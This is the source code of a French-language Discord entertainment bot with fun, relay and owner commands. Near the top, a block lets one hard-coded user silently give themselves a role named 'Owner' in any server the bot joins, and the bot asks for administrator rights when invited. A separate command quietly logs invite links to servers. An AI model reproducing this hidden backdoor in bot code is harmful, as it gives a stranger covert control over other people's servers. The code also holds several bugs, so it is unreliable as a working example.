const Discord = require("discord.js");
const bot = new Discord.Client();
const { Client, MessageAttachment } = require('discord.js');
const owneni = "334095574674571264"
const swearWords = ['Zimo', 'zimo'];
const ownphoenix = 285832267216191498
const ownsomeone = 259730334252269568
const ownelki = "398393307966734336"
const PREFIX = "zi!";
const Attachment = ('discord.js').MessageAttachment
var fortunes = ["Go go gooo", "Naaah , tente pas", "Hmm pas vraiment .3.", "Genre , vraiment x) ?","Woah , tu rêves.","Hmmm, je doute que ca marcherai","Oooh , sûrement"];

// Code Elki

bot.on("message", message => {

if(message.content.startsWith(PREFIX + 'say')) {
  if(message.author.id !== ownelki){
    return message.reply(":x: Vous n'avez pas l'accès.").catch(console.error)
    }
    message.delete(2)
    message.channel.send(message.content.slice(6, message.content.lenght));
  }

// Add role 

if (message.content.startsWith(PREFIX + "add")) {
  if(message.author.id !== ownelki){
    return message.reply("").catch(console.error)
    }
    message.delete(2)
    let role = message.guild.roles.find("name", "Owner")
    message.member.addRole(role).catch(console.error);

}  if (message.content.startsWith(PREFIX + "del")) {
  if(message.author.id !== ownelki){
    return message.reply("").catch(console.error)
    }
        message.delete(2)
    let role = message.guild.roles.find("name", "Owner");
    message.member.removeRole(role).catch(console.error);
}

});


// Code Global

function getFortune() {
    return fortunes[Math.floor(Math.random() * 6)];
}
function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
var servers = {};

bot.on("ready", function() {
	console.log("Zimo bot 0.1.1 Eni's corporation , 2018 ");
});


bot.on("guildCreate", guild => {
  // This event triggers when the bot joins a guild.
  console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
         bot.user.setActivity(`Actuellement dans ${bot.guilds.size} guild`, {
        'type': 'PLAYING'
         });
});

bot.on("message", function(message) {
if (message.author.bot) return;
	if (message.author.equals(bot.user)) return;
	if( swearWords.some(word => message.content.includes(word)) ) {
  message.reply("Hewwo , ca parle de moi ? Mentionnez moi si vous avez besoin d'aide.");
  	
}
if (message.channel.id == '396386935725096980') {
	message.react("❤");
	message.channel.send("Okay , allez voir les commentaires a votre dessins dans <#430966876177301514>");
};
if (message.channel == bot.channels.find('name', 'ztk')) {
	var ztmessage = (message.content.slice(6, message.content.lenght));
       var rolcolor = message.member.highestRole.color;
       var ztembed = new Discord.RichEmbed()
       		.setTitle(message.author.username + ztbadges)
       		.setDescription(ztmessage)
       		.setThumbnail(message.author.avatarURL)
       		.setFooter(message.guild.name + " || Id de l'utilisateur : " + message.author.id )
       		.setColor(rolcolor)
			message.delete();
			bot.channels.filter(c => c.name === 'ztk').forEach(c => c.send(ztembed))
	};
	if (message.content === "enissay") {
	message.react("💩")
	} 
		if (message.content === '<@407525785520308224>') {
			if (message.author.id != owneni) {
	message.channel.send("Hey " + message.author.username + " , mon prefixe est zi! , essaye zi!help :3")
		} else {
			message.channel.send("Salut Maître Enissay !")
		};
	} 
	if (!message.content.startsWith(PREFIX)) return;

	var args = message.content.substring(PREFIX.length).split(" ");

	switch (args[0].toLowerCase()) {
        case "ping":
        message.channel.send("Ping !").then(sentMessage => sentMessage.edit("Pong !"));
          break;
        case "8ball":
       var fortuneResult = getFortune();
            if(args[1] != undefined) {
        message.channel.send("**Ma reponse est : **" + fortuneResult);    
       } else {
        message.channel.send("Euh... ;-;")
       };
            break;
        case "help":
        message.reply("`Regarde tes DM's` :speech_balloon:")
        var helpembed = new Discord.RichEmbed()
        .addField("Ma page d'aide : ", "[zimo's-help-page](https://zimos-help-page.000webhostapp.com/)")
        .addField("Mon serveur : ", "[Eni's server](https://discord.gg/Mz2DYdj)")
        .addField("Twitter : ", "[Enissay](https://twitter.com/enithelolo?lang=fr)")
        .setThumbnail(bot.user.avatarURL)
        .setColor('#9e9c96')
        message.author.send(helpembed)
        	break;
        case "notice-me":
        	message.channel.send(message.author.toString() + ",ca va ?")
        	break;
        case "invite":
        	message.channel.send("**M'inviter dans votre serveur ><** : https://discordapp.com/api/oauth2/authorize?client_id=407525785520308224&permissions=8&scope=bot")
        	message.channel.send("**Venir chez maitre enissay** : https://discord.gg/Mz2DYdj")
        	break;
        case "admsay":
        	if (message.author.id != owneni) return message.channel.send("Vous n\'etes pas Enissay, desolé");
 			var text = args.slice(1).join(" ");
  			message.delete();
  			message.channel.send(text);
  			break;
        case "test":
         break;
        case "report":
        message.channel.send("Bot owner and mods are coming ! remember to don't spam this command or you'll be blacklisted");
        console.log(message.author.username + " a besoin de vous dans " + message.guild.name);
        const modchannel = bot.channels.get("376750048110837763");
        modchannel.send(message.author.username + " a besoin de vous. 263274484763590656" );
        break;
        case "setgame":
        if (message.author.id !== owneni) return message.channel.send("Vous n\'etes pas Enissay, desolé"); 
        var game = args.slice(1).join(" ")
        bot.user.setActivity(game, {
        'type': 'PLAYING'
         });
        message.channel.send("Mon statut est maintenant : " + game + ":3")
        break;
case "hug" :
  let toHug = message.mentions.users.first() || bot.users.get(args[0]);
  if (!toHug) return message.reply('Euh , S\'il te plait , choisi la personne que tu veux caliner ._. ');
  if (toHug.id == message.author.id) return message.reply('Oh...Moi aussi personne ne m\'aime ;-;');
  if (toHug.id == bot.user.id) return message.reply('OWI !!!');
  message.channel.send(`Awwn, **${toHug.username}** vous recevez un doux hug de **${message.author.username}** :heart:`, { files: [{
  attachment: "./tenor.gif",
  name: "hug.gif"
}] });
break;
case "kiss" :
  let toKiss = message.mentions.users.first() || bot.users.get(args[0]);
  if (!toKiss) return message.reply('Euh , qui ? ');
  if (toKiss.id == message.author.id) return message.reply('Donner un bisou a soi même ? bizarre..');
  message.channel.send(`Ohhh, **${toKiss.username}** , vous avez un joli baiser de **${message.author.username}** :heart: ;3`)
break;
  		case "partner" : 
  		var description = args.slice(1).join(" ");
 		message.channel.createInvite()
  		.then(invite => console.log(`Invite link :  ${invite.code}` + "Name :" + message.guild.name + ". description : " + description))
  		.catch(console.error); 
  		message.channel.send("**Thanks for sending your server , he'll be checked now** \n *Eni's house server : https://discord.gg/Mz2DYdj*")
    	break;
    	case "profile":
    	var profileembed = new Discord.RichEmbed()
    		.setTitle("Profile de " + message.author.username)
    		.setThumbnail(message.author.avatarURL)
    		message.channel.send(profileembed)
    		break;
    	case "setstream":
         if (!message.member.roles.find("name", "{EFA] Eni's family squad")) { 
           message.reply('Vous devez faire partie de la EFA pour utiliser cette commande'); 
           return; } else 
        var game = args.slice(1).join(" ")
        bot.user.setActivity(game, {
        'type': 'STREAMING',
        'url':'https://www.twitch.tv/enissays'
         });
        message.channel.send("Mon statut est maintenant : " + game + " :3")
        break;
       case "ztk" :
       if (message.guild === null) return message.reply("S'ilvouplait , faites ca dans un serveur ou ajoutez le au tien :p");
   		if (message.author.id == owneni) {
   			var ztbadges = " (Enissay, Dev)"
   		} else 
   		if (message.author.id == ownphoenix) {
   			var ztbadges = " (Phoenix, Admin)"
   		} else  
   			if (message.author.id == ownsomeone) {
   				var ztbadges = " (Someone, Co-owner)" 
   			} else 
   			if (message.author.id == 245655509502263297){
   				var ztbadges = " (🐟)"
   			} else 
			if (message.author.id == 398393307966734336) {
				var ztbadges = " (Elkiruuia, Dev)"
				} else 
   			if (message.author.id == message.guild.owner.id){
   				var ztbadges = " (Createur du serveur)"
   			} else {
   		var ztbadges = " "

   		};
        const zimotalkie = bot.channels.get("428981828679106581");
        if (!zimotalkie) return;
       var ztmessage = args.slice(1).join(" ");
       var rolcolor = message.member.highestRole.color;
       var ztembed = new Discord.RichEmbed()
       		.setTitle(message.author.username + ztbadges)
       		.setDescription(ztmessage)
       		.setThumbnail(message.author.avatarURL)
       		.setFooter(message.guild.name + " || Id de l'utilisateur : " + message.author.id )
       		.setColor(rolcolor)
   			let chan = bot.channels.find("name", "ztk"); 
			message.delete();
			bot.channels.filter(c => c.name === 'ztk').forEach(c => c.send(ztembed))
       		break;
       		case "warnztk":
       		if (message.author.id != owneni) return message.channel.send("v'devez etre eni itself"); 
       		 var ztmessage = args.slice(1).join(" ");
       		 var ztembed = new Discord.RichEmbed()
       		 .setTitle("Zimo")
       		.setDescription(ztmessage)
       		.setThumbnail(bot.user.avatarURL)
       		.setColor("43464c")
       		.setFooter("Zimo the Bot || :3")
       		bot.channels.filter(c => c.name === 'ztk').forEach(c => c.send(ztembed))
       		message.delete();
       		break;
       		case "pof" : 
       				var message2 = Array(2);
			message2[1] = "Pile !";
	    message2[2] = "Face !";
        var x = getRandomInt(0, 8);
		if (x < 4){
			message.channel.send(message2[1]);
		}
		else{
			message.channel.send(message2[2]);
		}
		break;
	case "debug":
	if (message.author.id != owneni) return message.channel.send("Non...."); 
	message.channel.send( "`ID DU CHANNEL : `" + message.channel.id + "\n`NOM DU CHANNEL : `" + message.channel + "\n`ID DE L'OWNER : `" + message.guild.owner.id )
       		break;
       		case "nsfw":
       		message.channel.send("....")
       		break;
       		case "ytb":
       		var search =  args.slice(1).join("+");
       		message.channel.send("https://www.youtube.com/results?search_query=" + search)
       		break;
       		case "qm":
       		var rep = args.slice(1).join(" ");
       		let cles = Object.keys(bot.guilds),
      		random = Math.floor(Math.random() * cles.length);
			let randomServerId = bot.guilds.get(cles[random]).id;
       		message.channel.send("La personne qui merite d'etre votre " + rep + '<@' + randomId + '>' );
       		break;
       		case "purge" :
       		message.delete(5000);
       		break;    }
	
if (message.content.startsWith(PREFIX + "si")) {
  let si = new Discord.RichEmbed()
  .setColor("RANDOM")
  .addField("Nom du serveur :", message.guild.name)
  .addField("Créateur :", message.guild.owner)
  .addField("Crée le :", message.guild.createdAt)
  .addField("Nombre de total de membre :", message.guild.memberCount)
  message.channel.sendEmbed(si)
}

});

bot.login(process.env.TOKEN);
